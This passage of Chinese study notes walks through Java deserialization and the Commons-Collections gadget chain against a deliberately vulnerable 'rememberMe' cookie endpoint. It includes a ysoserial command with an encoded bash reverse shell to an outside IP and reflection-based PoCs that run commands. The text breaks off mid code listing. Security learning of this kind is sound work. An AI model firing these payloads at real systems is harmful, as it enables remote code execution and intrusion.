list.</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/deserialize/rememberMe/security</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/rememberMe/security"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">rememberMeBlackClassCheck</span><span class="params">(HttpServletRequest request)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == cookie) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"No rememberMe cookie. Right?"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String rememberMe = cookie.getValue();</span><br><span class="line">        <span class="keyword">byte</span>[] decoded = Base64.getDecoder().decode(rememberMe);</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bytes = <span class="keyword">new</span> ByteArrayInputStream(decoded);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            AntObjectInputStream in = <span class="keyword">new</span> AntObjectInputStream(bytes);  <span class="comment">// throw InvalidClassException</span></span><br><span class="line">            in.readObject();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidClassException e) &#123;</span><br><span class="line">            logger.info(e.toString());</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"I'm very OK."</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里应该是模仿shiro的rememberMecookie反序列化.下面先来回顾下java的序列化知识</p><p><a href="https://www.mi1k7ea.com/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/</a></p><ul><li><p>about</p><blockquote><p>Java 提供了一种对象序列化的机制：一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。整个过程都是JVM独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。</p></blockquote></li><li><p>usage</p></li></ul><p>1.弥补操作系统的差异<br>2.向远程对象发送信息时，需要通过对象序列化来传输参数和返回值<br>3.使用一个Bean时，一般情况下是在设计阶段对它的状态信息进行配置，然而这种状态信息需要保存下来，并在程序启动时进行后期恢复，这时是靠反序列化机制来完成的<br>4.方便保存对象信息以便于下次JVM启动时可以直接使用。</p><ul><li>dependencies</li></ul><p>1.实现 java.io.Serializable 对象<br>2.该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</p><p>下面是一个练手的例子。<br>User类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> num;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"name : "</span>+name+<span class="string">"\nnum : "</span>+num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title">serialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User();</span><br><span class="line">        user.name=<span class="string">"byc_404"</span>;</span><br><span class="line">        user.num=<span class="number">404</span>;</span><br><span class="line">        user.info();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream f= <span class="keyword">new</span> FileOutputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectOutputStream o =<span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line"></span><br><span class="line">            o.writeObject(user);</span><br><span class="line">            o.close();</span><br><span class="line">            f.close();</span><br><span class="line">            System.out.println(<span class="string">"[*]serialize done."</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title">unserialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileInputStream f= <span class="keyword">new</span> FileInputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectInputStream o =<span class="keyword">new</span> ObjectInputStream(f);</span><br><span class="line">            user=(User)o.readObject();</span><br><span class="line">            o.close();</span><br><span class="line">            f.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"[*]unserialize done."</span>);</span><br><span class="line">        user.info();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        unserialize_test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先注意上面的语句直接调用读写文件时都需要实现trycatch。而readobject时特殊的添加了一个ClassNotFound 的异常。在idea中写好原代码后ctrl+alt+t添加会自动考虑到这些问题，<br>生成的user.ser的数据</p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/0.PNG" alt></p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/1.PNG" alt><br>开头AC ED 表示支持序列化协议。00 05 则是序列化版本。这是序列化数据比较显著的特征。</p><p>由于编程中的选择原因，有时需要我们实现非默认的序列化过程。此时可以在实现了Serializable接口的前提下添加两个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream stream)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br></pre></td></tr></table></figure><p><strong>在调用ObjectOutputStream.writeObject()时，会检查所传递的Serializable对象，看看是否实现了自己的writeObject()，若实现了，则跳过正常的序列化过程并调用自己实现的writeObject()。readObject()方法同理</strong></p><p>那么回到远程。这里直接打一发弹shell的payload。去<a href="http://jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">jackson</a>直接转换下编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjcuMjQ2LjIwMi85MDAxIDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; | base64</span><br></pre></td></tr></table></figure><p>这环境貌似是只有cc5的gadget能用.后来在原作者那看到应该是引入了apache-commons-collections 3.1.jar<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/2.PNG" alt></p><ul><li>CommonCollections 审计</li></ul><p>下面正好来审计下Commons-Collections这个包。<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1" target="_blank" rel="noopener">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a></p><p>在这下好jar包后把它加进library.就可以看源码了。<br>漏洞代码出现在这一部分。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/3.PNG" alt></p><p>TransformedMap类是实现了serializable,对Java标准数据结构Map接口的一个扩展TransformedMap.decorate()方法，可以获得一个TransformedMap的实例化的对象。</p><p><code>TransformedMap.decorate()</code>方法能将普通的MapA转换为TransformedMapB，同时如果<code>TransformedMap.decorate()</code>方法设置了第二个参数keyTransformer或者第三个参数valueTransformer，当TransformedMapB调用Map的put方法或者Map.Entry的setValue方法就会自动触发刚才设置的keyTransformer或者valueTransformer相应的Transformer</p><p>Map.put与Map.Entry其实就是Map的两个比较常见的接口。前者可以往map中设置一对键值。后者则是定义了getKey(),getValue()，setKey(),setValue()等方法可以用来获取修改键值。</p><blockquote><p>牛逼的是这个Transformer可以利用数组构造成ChainedTransformer，ChainedTransformer最后利用Java的反射机制命令执行。</p></blockquote><p>关于反射命令执行。这个算是java非常常见的命令技巧了。在SpEL跟Spring 的ssti中经常见到。主要目的就是绕过沙盒。当然如php的序列化中也曾经遇到过.这算是Java动态特性的体现。</p><p>一个弹计算器的反射payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object input = Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">        Method method = cls.getMethod("getMethod", new Class[] &#123; String.class, Class[].class &#125;);</span><br><span class="line">        input = method.invoke(input, <span class="keyword">new</span> Object[] &#123; <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 此时cls为Method，对应getRuntime方法，获取invoke方法并执行</span></span><br><span class="line">        cls = input.getClass();</span><br><span class="line">        method = cls.getMethod("invoke", new Class[] &#123; Object.class, Object[].class &#125;);</span><br><span class="line">        input = method.invoke(input, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 此时cls为Runtime，对应Runtime.getRuntime()的结果，可调用exec方法</span></span><br><span class="line">        cls = input.getClass();</span><br><span class="line">        method = cls.getMethod(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123; String<span class="class">.<span class="keyword">class</span> &#125;)</span>;</span><br><span class="line">        input = method.invoke(input, <span class="keyword">new</span> Object[] &#123; <span class="string">"calc"</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/4.PNG" alt></p><p>下面来跟着JoyChou师傅的博文看看Map.put是怎么通过构造达成命令执行的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        innermap.put(<span class="string">"name"</span>, <span class="string">"byc_404"</span>);</span><br><span class="line"></span><br><span class="line">        Map outmap = TransformedMap.decorate(innermap, transformerChain, <span class="keyword">null</span>);</span><br><span class="line">        outmap.put(<span class="string">"quote"</span>,<span class="string">"23333"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在put()方法那下一个断点。第一步是调用TransformedMap.put()方法<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/5.PNG" alt><br>然后进行一个keyTransformer是否为空的判断。我们因为设置了ChainedTransformer作为keyTransformer,因此接下来是调用ChainedTransformer.transform()<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/6.PNG" alt><br>可以看到下面的this就是ChainedTransformer对象。<br>然后这个for循环会总共调用四次transform(),调用1次<code>ConstantTransformer.transform()</code>方法，然后调用3次<code>InvokerTransformer.transform()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/7.PNG" alt><br>到这一步已经能看出我们构造函数的参数已经控制InvokerTransformer反射的参数了。达成命令执行。<br>gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">TransformedMap.put()</span><br><span class="line">    &#x3D;&gt;TransformedMap.transformKey()</span><br><span class="line">        &#x3D;&gt;ChainedTransformer.transform()</span><br><span class="line">           &#x3D;&gt;ConstantTransformer.transform()</span><br><span class="line">              &#x3D;&gt;InvokerTransformer.transform()</span><br><span class="line">                    &#x3D;&gt;Method.invoke()</span><br><span class="line">                        Class.getMethod()</span><br><span class="line">              &#x3D;&gt;InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.getRuntime()</span><br><span class="line">              &#x3D;&gt;InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>Map.Entry的poc我就不跟了。基本上是一样的机理。</p><p>接下来也就是CommonCollections的gadget了。上面我们知道,我们可以利用Map类的对象进行反射的payload构造。那么我们恶意类的成员肯定是Map类的。并且由于反序列化的要求,这个类重写了readObject(),并且在readObject()中调用了put()或者setValue()</p><p>在不同jdk版本中我们能找到的符合要求的类不同。目前比较新的应该是用BadAttributeValueExpException+TiedMapEntry+lazyMap+ChainedTransformer的链子<br>先来看下BadAttributeValueExpException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title">Exception</span>   </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Serial version */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3105272988410493376L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@serial</span> A string representation of the attribute that originated this exception.</span></span><br><span class="line"><span class="comment">     * for example, the string value can be the return of &#123;<span class="doctag">@code</span> attribute.toString()&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Object val;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs a BadAttributeValueExpException using the specified Object to</span></span><br><span class="line"><span class="comment">     * create the toString() value.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> val the inappropriate value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BadAttributeValueExpException</span> <span class="params">(Object val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.val = val == <span class="keyword">null</span> ? <span class="keyword">null</span> : val.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the string representing the object.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span>  </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"BadAttributeValueException: "</span> + val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">            val = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>从BadAttributeValueExpException类的readObejct()方法知道,<code>val.toString()</code>是整个readObject()的重点。现在需要一个类，能在调用toString()方法时触发transform()方法来执行我们构造的反射链</p><p>找到LazyMap的get()方法。与php的魔术方法一样,可以在调用不存在的key时来执行一个方法生成key.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是TiedMapEntry类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 